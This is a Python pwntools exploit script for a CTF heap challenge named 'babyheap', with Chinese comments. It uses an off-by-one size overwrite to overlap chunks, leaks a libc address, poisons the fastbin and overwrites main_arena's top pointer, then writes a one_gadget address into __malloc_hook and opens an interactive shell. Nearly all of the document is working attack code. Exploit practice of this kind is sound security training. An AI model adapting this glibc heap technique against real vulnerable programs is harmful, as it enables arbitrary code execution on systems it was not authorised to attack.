#coding=utf-8
from pwn import *

context.terminal=["tmux","splitw","-h"]
debug =0

p = process("./babyheap")
one_offset = 0x4526a

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    gdb.attach(p,'''
   b *(0x555555554000+0xE86)
   b *(0x555555554000+0xFA7)
   b *(0x555555554000+0x10C0) 
    ''')
#malloc,update,delete
def alloc(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))

def update(index, size, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Content: ")
    p.sendline(content)

def delete(index):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(index))

def view(index):
    p.recvuntil("Command: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(index))
def debug():
    gdb.attach(p,'''
   b *(0x555555554000+0xE86)
   b *(0x555555554000+0xFA7)
   b *(0x555555554000+0x10C0) 
   b *(0x555555554000+0xdd5)
    ''')

alloc(0x48) #0
alloc(0x48) #1
alloc(0x48) #2
alloc(0x48) #3
update(0, 0x49, "A"*0x48 + "\xa1")
delete(1)   #1
alloc(0x48) #1
view(2)     
p.recvuntil("Chunk[2]: ")
leak = u64(p.recv(8))
libc_base = leak - 0x58-libc.symbols["__malloc_hook"]-0x10

alloc(0x48) #4 = 2

dest_offset=0x3c4b38
delete(2)
update(4,0x8,p64(0x61))
alloc(0x48)#2, fastbinsY[3]=0x61 

alloc(0x58)#5
alloc(0x58)#6
alloc(0x58)#7
alloc(0x58)#8
update(5,0x59,'A'*0x58+'\xc1')
delete(6)
alloc(0x58)#6
alloc(0x58)#9=7
delete(7)
update(9,0x8,p64(libc_base+dest_offset))
alloc(0x58)#7
delete(9)
alloc(0x58)#9
alloc(0x58)#10 目标chunk
payload='\x00'*0x30+p64(libc_base+libc.symbols["__malloc_hook"]-0x10)
payload=payload.ljust(72,'\x00')
payload+=p64(0x00007ffff7dd1b78-0x7ffff7a0d000+libc_base)#绕过检查，不知道为什么莫名奇妙的会把unsortedbin破坏掉
payload+=p64(0x00007ffff7dd1b88-0x7ffff7a0d000+libc_base)
update(10,0x58,payload)#修改topchunk
delete(2)#恢复fastbin，由于后面会malloc_consolidate会合并fastbin，会报错，这里用来恢复fastbin
update(4,0x8,p64(0))#将fd修改为0
alloc(0x48)#2将fastbin中的chunk，malloc出来，此时fastbin为空
 #   debug()
alloc(0x58)#11 获得到目标chunk
update(11,8,p64(libc_base+one_offset))
alloc(0x58)#触发__malloc_hook
p.interactive()
